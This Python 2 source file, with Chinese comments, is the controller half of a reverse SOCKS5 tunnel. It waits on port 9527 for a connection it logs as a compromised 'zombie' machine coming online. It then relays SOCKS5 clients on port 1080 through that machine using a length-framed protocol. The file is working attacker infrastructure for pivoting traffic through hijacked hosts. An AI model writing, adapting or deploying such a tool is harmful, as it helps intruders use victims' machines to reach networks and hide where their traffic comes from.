#!/usr/bin/env python
#coding:utf-8

import select
import socket
import struct 
import time
from sock_v5 import isUnEstablishedSockV5, addUnEstablishedSockV5, makeSockV5Connection, unEstablishedSocks

CHUNCK_SIZE=10240

# 所有socket数据：地址，套接字，未发送完的数据
peers = []	# (addr, fd, [])

def debug():
	import pdb
	pdb.set_trace()

def addr2hex(addr):
	ip, port = addr
	a,b,c,d = map(int, ip.split('.'))
	addr_hex = struct.pack('!4BH', a, b, c, d, port)
	return addr_hex

def hex2addr(hex):
	a,b,c,d,port = struct.unpack('!4BH', hex)
	ip = '%d.%d.%d.%d' % (a, b, c, d)
	return (ip, port)

# sendto_dest 仅供 process_tunnel_data 函数调用
def sendto_dest(addr_tuple, data):
	global peers
	for _addr_tuple, fd, write_queue in peers:
		if addr_tuple == _addr_tuple:
			write_queue.append(data)
			return
	# 应该给tunnel发送信息：告知断开与addr的连接
	# TODO


tunnel_data = ''
def clear_tunnel_cache():
	'''
		清空Tunnel读队列的所有未处理数据
	'''
	global tunnel_data
	tunnel_data = ''

current_addr_tuple = None	# Tunnel中正在处理中的数据块地址
remain_len = 0		# Tunnel中数据块剩余长度
def process_tunnel_data(new_data):
	'''
		处理Tunnel读队列的未处理数据,new_data为新数据
	'''
	global tunnel_data
	global current_addr_tuple
	global remain_len
	
	# 将新数据追加到Tunnel的未读队尾
	tunnel_data += new_data

	if remain_len == 0:
		# 开始读取另一个数据块信息
		if len(tunnel_data) < 16:	# 不足一个数据块头部信息
			return
		# 读取一个数据块头部信息
		head = tunnel_data[:16]
		data = tunnel_data[16:]
		dest_addr = hex2addr(head[:6])
		local_addr = hex2addr(head[6:12])
		remain_len = struct.unpack('!I', head[12:])[0]
		current_addr_tuple = (dest_addr, local_addr)
		if remain_len == 0:
			# 数据块头部信息中的Len=0,表示关闭连接
			del_peer_by_addr(current_addr_tuple)
			tunnel_data = data
			process_tunnel_data('')
			return
	else:
		# 之前的数据块未读取完毕，继续读取并处理
		data = tunnel_data

	# 转发真正的数据
	if len(data) < remain_len:
		# Tunnel读队列缓存中不足当前数据块数据
		sendto_dest(current_addr_tuple, data)
		remain_len -= len(data)
		tunnel_data = ''
	else:
		sendto_dest(current_addr_tuple, data[:remain_len])
		tunnel_data = data[remain_len:]
		remain_len = 0
		current_addr_tuple = None
		# 前一个数据块处理完毕，继续处理下一个数据块
		if tunnel_data:
			process_tunnel_data('')

def del_peer_by_fd(_fd):
	global peers
	for peer in peers:
		(dest_addr, local_addr), fd, x = peer
		if fd == _fd:
			print '将[(%s,%s), %d]移出peers' % (str(dest_addr), str(local_addr), _fd.fileno())
			break
	fd.close()
	peers.remove(peer)

def del_peer_by_addr(addr_tuple):
	global peers
	found = False
	for peer in peers:
		_addr_tuple, fd, x = peer
		if _addr_tuple == addr_tuple:
			found = True
			(dest_addr, local_addr) = addr_tuple
			print '将[%d, (%s,%s)]移出peers' % (fd.fileno(), str(dest_addr), str(local_addr))
			break
	if found:
		fd.close()
		peers.remove(peer)

if __name__ == '__main__':
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server_addr = ('0.0.0.0', 9527)
	server.bind(server_addr)
	server.setblocking(False)
	server.listen(1)
	#peers.append((server_addr, server, None))

	local_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	local_server_addr = ('0.0.0.0', 1080)
	local_server.bind(local_server_addr)
	local_server.setblocking(False)
	local_server.listen(10)
	#peers.append((local_server_addr, local_server, None))

	tunnel_sock = None
	tunnel_write_queue = []

	while True:

		rfds = []
		wfds = []
		for x, fd, write_queue in peers:
			rfds.append(fd)
			if write_queue:
				wfds.append(fd)
		rfds.extend(unEstablishedSocks())
		if tunnel_sock:
			rfds.append(tunnel_sock)
			if tunnel_write_queue:
				wfds.append(tunnel_sock)
		if tunnel_sock == None:
			rfds.append(server)
		rfds.append(local_server)

		#print 'select: %d %d' % (len(rfds), len(wfds))
		readable, writeable, exceptional = select.select(rfds, wfds, [], 30)
		
		tunnel_error = False	# 通道错误标志
		
		# 处理所有可读套接字
		for fd in readable:
			if fd == server:
				tunnel_sock, addr = server.accept()
				tunnel_write_queue = []
				print '肉鸡上线[%s]' % str(addr)
				server.close()
				#peers.append((addr, tunnel_sock, tunnel_write_queue))
			elif fd == local_server:
				local_client_sock ,local_client_addr = local_server.accept()
				print '新sockv5 连接[%s]' % str(local_client_addr)
				addUnEstablishedSockV5(local_client_addr, local_client_sock)
			elif fd == tunnel_sock:
				# Tunnel数据处理
				new_data = fd.recv(CHUNCK_SIZE)
				if not new_data:
					# Tunnel断开,重置
					print 'Tunnel读取失败，断开，重置'
					tunnel_error = True
					tunnel_sock.close()
					break
				process_tunnel_data(new_data)
			else: # 读取本地连接数据
				if isUnEstablishedSockV5(fd):
					# 尝试建立sock_v5连接
					addr_tuple = makeSockV5Connection(fd)
					if addr_tuple != None:
						peers.append((addr_tuple, fd, []))
				else:
					# 从sockv5客户端读取数据
					try:
						new_data = fd.recv(CHUNCK_SIZE)
					except socket.error, e:
						print e
						new_data = ''
					if not new_data:
						del_peer_by_fd(fd)
					else:
						found = False
						for (dest_addr, local_addr), _fd, write_queue in peers:
							if _fd == fd:
								found = True
								break
						if found:
							#print '从本地连接读取[%d]数据,开始送至隧道写队列[%s]' % (len(new_data), str(addr))
							dest_addr_hex = addr2hex(dest_addr)
							local_addr_hex = addr2hex(local_addr)
							data_len_hex = struct.pack('!I', len(new_data))
							# 将从本地连接读取的数据,加上数据块头部信息，一并写入通道
							tunnel_write_queue.append(dest_addr_hex + local_addr_hex + data_len_hex + new_data)
						else:
							print 'Where to send this data?'
							pass
				# end if isUnEstablishedSockV5(fd):
			# end else: # 读取本地连接数据
				
		# Tunnel断裂，重置
		if tunnel_error:
			break

		# 处理所有可写套接字
		for fd in writeable:
			# 先检测通道是否可写
			if fd == tunnel_sock and tunnel_write_queue:
				try:
					# 将数据块写入通道
					fd.send(tunnel_write_queue.pop(0))
				except socket.error, e:
					# 若Tunnel无法写入，则断开Tunnel,重置
					print 'Tunnel写失败，断开，重置'
					tunnel_error = True
					tunnel_sock.close()
					break

			# 再检测peer是否可写
			found = False
			for peer in peers:
				(dest_addr, local_addr), _fd, write_queue = peer
				if fd == _fd and write_queue:
					found = True
					break
			if found:
				try:
					# 将数据写入真正的对端
					data = write_queue.pop(0)
					fd.send(data)
				except socket.error, e:
					print '往真正对端写失败'
					del_peer_by_fd(fd)

					# 通知Tunnel对方，此关闭连接
					dest_addr_hex = addr2hex(dest_addr)
					local_addr_hex = addr2hex(local_addr)
					zero_data_hex = struct.pack('!I', 0)
					close_data = dest_addr_hex + local_addr_hex + zero_data_hex
					print '通知Tunnel对方 关闭[%s]' % str(addr)
					tunnel_write_queue.append(close_data)


		# Tunnel断裂，重置
		if tunnel_error:
			break

	# end while True:

	server.close()
	local_server.close()

